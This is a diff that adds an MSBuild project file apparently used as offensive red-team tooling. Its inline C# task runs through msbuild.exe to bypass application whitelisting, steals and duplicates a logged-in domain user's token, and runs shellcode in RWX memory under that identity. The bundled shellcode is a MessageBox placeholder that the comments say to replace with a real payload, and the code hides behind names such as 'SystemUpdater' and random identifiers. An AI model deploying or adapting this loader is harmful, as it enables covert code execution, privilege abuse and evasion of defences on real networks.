@@ -1,0 +1,293 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+ 
+  <!-- USE AT YOUR OWN RISK -->
+  <!-- This inline task executes c# shellcode in a thread that impersonates a domain user when MSBuild.exe is run as SYSTEM. -->
+  <!-- Use if environment uses proxy that only domain users can pass through and not local SYSTEM account (ex: schtasks /RU SYTEM) -->
+  <!-- The domain variable need to be set depending on the domain name -->
+  <!-- replace Domain (Variable: "domain_name"), currently set to "ABC", if user name is ABC\User1, the domain needs to be set to ABC -->  
+  <!-- replace Shellcode (Variable: "strUpdatePatch"), currently it is only a simple error message code, and should be replaced with your actual payload -->
+  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe msbuild_inject_impersonation.xml -->
+  <!-- Save This File And Execute The Above Command -->
+  <!-- Author: Taher Azab -->
+  <!-- Forked from work by Evan Pena, Twitter: @evan_pena2003 , https://github.com/chango77747/ShellCodeInjector_MsBuild/blob/master/shellCodeTest_msbuild.csproj -->
+  <!-- Refrence for MSBuild whitelist bypass: http://subt0x10.blogspot.ie/2016/09/bypassing-application-whitelisting.html-->
+  <!-- Refrences used for impersonation : http://stackoverflow.com/questions/13504825/how-to-invoke-a-function-impersonating-another-user-instead-of-system , http://stackoverflow.com/questions/132620/how-do-you-retrieve-a-list-of-logged-in-connected-users-in-net , http://stackoverflow.com/questions/13166848/still-getting-duplicate-token-error-after-calling-duplicatetokenex-for-impersona -->
+  <!-- License: BSD 3-Clause -->
+  
+  <Target Name="SystemUpdater">
+   <FragmentExample />   
+  </Target>
+  <UsingTask
+    TaskName="FragmentExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>	
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+			using System;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;			
+			using System.Net;
+			using System.Net.Sockets;
+			using System.Runtime.InteropServices;
+			using System.Text;
+			using System.IO;
+			using System;
+			using System.Collections.Generic;
+			using System.Runtime.InteropServices;
+			using System.Security.Principal;
+				
+			public class FragmentExample :  Task, ITask
+			{
+				public override bool Execute()
+				{					
+					SystemUpdate.Main();
+					return true;	
+				}
+			}
+			
+			public class SystemUpdate
+			{
+				[DllImport("wtsapi32.dll")]
+				static extern IntPtr WTSOpenServer([MarshalAs(UnmanagedType.LPStr)] String pServerName);
+
+				[DllImport("wtsapi32.dll")]
+				static extern void WTSCloseServer(IntPtr hServer);
+
+				[DllImport("wtsapi32.dll")]
+				static extern Int32 WTSEnumerateSessions(
+					IntPtr hServer,
+					[MarshalAs(UnmanagedType.U4)] Int32 Reserved,
+					[MarshalAs(UnmanagedType.U4)] Int32 Version,
+					ref IntPtr ppSessionInfo,
+					[MarshalAs(UnmanagedType.U4)] ref Int32 pCount);
+
+				[DllImport("wtsapi32.dll")]
+				static extern void WTSFreeMemory(IntPtr pMemory);
+
+				[DllImport("Wtsapi32.dll")]
+				static extern bool WTSQuerySessionInformation(
+					System.IntPtr hServer, int sessionId, WTS_INFO_CLASS wtsInfoClass, out System.IntPtr ppBuffer, out uint pBytesReturned);
+
+				[DllImport("wtsapi32.dll", SetLastError = true)]
+				static extern int WTSQueryUserToken(UInt32 sessionId, out IntPtr Token);
+				
+				
+				[DllImport("kernel32")]
+				private static extern UInt32 VirtualAlloc(UInt32 JWmoIlFhPkGN, UInt32 UzWUXeiqddon, UInt32 szYzablY, UInt32 GXqpQXZYHpUiQ);
+				[DllImport("kernel32")]
+				private static extern IntPtr CreateThread(UInt32 cfYPJVtsoTj, UInt32 BzaNozPQLx, UInt32 YcjYxbv, IntPtr FmjdKEI, UInt32 WalIOQWiqTD, ref UInt32 VmRrcdmoX);
+				[DllImport("kernel32")]
+				private static extern UInt32 WaitForSingleObject(IntPtr xGtvlmms, UInt32 TgXuJhLpycZ);
+
+				[DllImport("advapi32.dll", SetLastError = true)]
+				public static extern bool SetThreadToken(
+					ref IntPtr Thread,
+					IntPtr Token);
+					
+				[StructLayout(LayoutKind.Sequential)]
+				public struct SECURITY_ATTRIBUTES
+				{
+					public int Length;
+					public IntPtr lpSecurityDescriptor;
+					public bool bInheritHandle;
+				}
+
+				[DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
+				public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, int TokenType, int ImpersonationLevel, ref IntPtr DuplicateTokenHandle);
+
+				public enum SecurityImpersonationLevel
+				{
+					SecurityAnonymous = 0,
+					SecurityIdentification = 1,
+					SecurityImpersonation = 2,
+					SecurityDelegation = 3
+				}
+
+				public enum TokenType
+				{
+					TokenPrimary = 1,
+					TokenImpersonation = 2
+				}
+					
+				
+				[StructLayout(LayoutKind.Sequential)]
+				private struct WTS_SESSION_INFO
+				{
+					public Int32 SessionID;
+
+					[MarshalAs(UnmanagedType.LPStr)]
+					public String pWinStationName;
+
+					public WTS_CONNECTSTATE_CLASS State;
+				}
+				
+				
+
+				public enum WTS_INFO_CLASS
+				{
+					WTSInitialProgram,
+					WTSApplicationName,
+					WTSWorkingDirectory,
+					WTSOEMId,
+					WTSSessionId,
+					WTSUserName,
+					WTSWinStationName,
+					WTSDomainName,
+					WTSConnectState,
+					WTSClientBuildNumber,
+					WTSClientName,
+					WTSClientDirectory,
+					WTSClientProductId,
+					WTSClientHardwareId,
+					WTSClientAddress,
+					WTSClientDisplay,
+					WTSClientProtocolType
+				}
+				public enum WTS_CONNECTSTATE_CLASS
+				{
+					WTSActive,
+					WTSConnected,
+					WTSConnectQuery,
+					WTSShadow,
+					WTSDisconnected,
+					WTSIdle,
+					WTSListen,
+					WTSReset,
+					WTSDown,
+					WTSInit
+				}
+
+				public static void Main()
+				{
+					ListUsers("localhost");
+				}
+
+				public static IntPtr OpenServer(String Name)
+				{
+					IntPtr server = WTSOpenServer(Name);
+					return server;
+				}
+				public static void CloseServer(IntPtr ServerHandle)
+				{
+					WTSCloseServer(ServerHandle);
+				}
+				public static void ListUsers(String ServerName)
+				{
+					IntPtr serverHandle = IntPtr.Zero;
+					List<String> resultList = new List<string>();
+					serverHandle = OpenServer(ServerName);
+					
+					string strUpdatePatch = InputToByteArrayString("0x33,0xc9,0x64,0x8b,0x49,0x30,0x8b,0x49,0x0c,0x8b,0x49,0x1c,0x8b,0x59,0x08,0x8b,0x41,0x20,0x8b,0x09,0x80,0x78,0x0c,0x33,0x75,0xf2,0x8b,0xeb,0x03,0x6d,0x3c,0x8b,0x6d,0x78,0x03,0xeb,0x8b,0x45,0x20,0x03,0xc3,0x33,0xd2,0x8b,0x34,0x90,0x03,0xf3,0x42,0x81,0x3e,0x47,0x65,0x74,0x50,0x75,0xf2,0x81,0x7e,0x04,0x72,0x6f,0x63,0x41,0x75,0xe9,0x8b,0x75,0x24,0x03,0xf3,0x66,0x8b,0x14,0x56,0x8b,0x75,0x1c,0x03,0xf3,0x8b,0x74,0x96,0xfc,0x03,0xf3,0x33,0xff,0x57,0x68,0x61,0x72,0x79,0x41,0x68,0x4c,0x69,0x62,0x72,0x68,0x4c,0x6f,0x61,0x64,0x54,0x53,0xff,0xd6,0x33,0xc9,0x57,0x66,0xb9,0x33,0x32,0x51,0x68,0x75,0x73,0x65,0x72,0x54,0xff,0xd0,0x57,0x68,0x6f,0x78,0x41,0x01,0xfe,0x4c,0x24,0x03,0x68,0x61,0x67,0x65,0x42,0x68,0x4d,0x65,0x73,0x73,0x54,0x50,0xff,0xd6,0x57,0x68,0x72,0x6c,0x64,0x21,0x68,0x6f,0x20,0x57,0x6f,0x68,0x48,0x65,0x6c,0x6c,0x8b,0xcc,0x57,0x57,0x51,0x57,0xff,0xd0,0x57,0x68,0x65,0x73,0x73,0x01,0xfe,0x4c,0x24,0x03,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0x54,0x53,0xff,0xd6,0x57,0xff,0xd0");
+
+					try
+					{
+						IntPtr SessionInfoPtr = IntPtr.Zero;
+						IntPtr userPtr = IntPtr.Zero;
+						IntPtr domainPtr = IntPtr.Zero;
+						Int32 sessionCount = 0;
+						Int32 retVal = WTSEnumerateSessions(serverHandle, 0, 1, ref SessionInfoPtr, ref sessionCount);
+						Int32 dataSize = Marshal.SizeOf(typeof(WTS_SESSION_INFO));
+						Int32 currentSession = (int)SessionInfoPtr;
+						uint bytes = 0;
+						if (retVal != 0)
+						{
+							for (int i = 0; i < sessionCount; i++)
+							{
+								WTS_SESSION_INFO si = (WTS_SESSION_INFO)Marshal.PtrToStructure((System.IntPtr)currentSession, typeof(WTS_SESSION_INFO));
+								currentSession += dataSize;
+
+								WTSQuerySessionInformation(serverHandle, si.SessionID, WTS_INFO_CLASS.WTSUserName, out userPtr, out bytes);
+								WTSQuerySessionInformation(serverHandle, si.SessionID, WTS_INFO_CLASS.WTSDomainName, out domainPtr, out bytes);
+
+								Console.WriteLine("Domain and User: " + Marshal.PtrToStringAnsi(domainPtr) + "\\" + Marshal.PtrToStringAnsi(userPtr));
+
+								WTSFreeMemory(userPtr);
+								WTSFreeMemory(domainPtr);
+
+
+								IntPtr currentToken = new IntPtr();
+								int bRet = WTSQueryUserToken((UInt32)si.SessionID, out currentToken);
+
+								
+								//Need to set condition to match your domain
+								string domain_name = "ABC";
+								
+								if(Marshal.PtrToStringAnsi(domainPtr) == domain_name){
+									Console.WriteLine(string.Format("User Token: {0}", currentToken));
+									Console.WriteLine("Before Impersonation: "+System.Security.Principal.WindowsIdentity.GetCurrent().Name);
+
+									Console.WriteLine("After Impersonation: "+System.Security.Principal.WindowsIdentity.GetCurrent().Name);
+									
+									
+									SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
+									sa.bInheritHandle = true;
+									sa.Length = Marshal.SizeOf(sa);
+									sa.lpSecurityDescriptor = (IntPtr)0;
+
+									uint MAXIMUM_ALLOWED = (uint)(TokenAccessLevels.Query | TokenAccessLevels.Duplicate | TokenAccessLevels.Impersonate);
+									IntPtr dupTokenHandle = new IntPtr();
+									bool dupReturnValue = DuplicateTokenEx(currentToken, MAXIMUM_ALLOWED, ref sa, (int)SecurityImpersonationLevel.SecurityDelegation, (int)TokenType.TokenImpersonation, ref dupTokenHandle);
+									Console.WriteLine(string.Format("Token p: {0}", dupTokenHandle));
+									
+									
+									
+									UInt32 ITGMyKKAUUm = VirtualAlloc(0, (UInt32)strUpdatePatch.Length, 0x1000, 0x40);
+									byte[] updatecode = StringToByteArray(strUpdatePatch);					
+
+									Marshal.Copy(updatecode, 0, (IntPtr)(ITGMyKKAUUm), updatecode.Length);
+									IntPtr DYtvdEXCykZ = IntPtr.Zero; UInt32 UgAJRevmsLwnO = 0; IntPtr qhaCJWwoK = IntPtr.Zero;
+									DYtvdEXCykZ = CreateThread(0, 0, ITGMyKKAUUm, qhaCJWwoK, 0, ref UgAJRevmsLwnO);
+									
+                                    
+									SetThreadToken(ref DYtvdEXCykZ, dupTokenHandle);
+									WaitForSingleObject(DYtvdEXCykZ, 0xFFFFFFFF);
+								}
+							}
+
+							WTSFreeMemory(SessionInfoPtr);
+						}
+
+						Console.WriteLine("Press any key to exit.");
+						Console.ReadKey();
+					}
+					finally
+					{
+						CloseServer(serverHandle);
+					}
+
+				}
+				
+				
+				public static string InputToByteArrayString(string input)
+				{
+					string strUpdatePatch = input.Replace("0x", "");
+					strUpdatePatch = strUpdatePatch.Replace(",", "");
+					return strUpdatePatch;
+				}
+
+				public static byte[] StringToByteArray(String hex)
+				{
+					int NumberChars = hex.Length;
+					byte[] bytes = new byte[NumberChars / 2];
+					for (int i = 0; i < NumberChars; i += 2)
+						bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
+					return bytes;
+				}
+
+				public static string ByteArrayToString(byte[] ba)
+				{
+					StringBuilder hex = new StringBuilder(ba.Length * 2);
+					foreach (byte b in ba)
+						hex.AppendFormat("{0:x2}", b);
+					return hex.ToString();
+				}
+
+			}
+				
+        ]]>
+      </Code>
+    </Task>
+	</UsingTask>
+</Project>
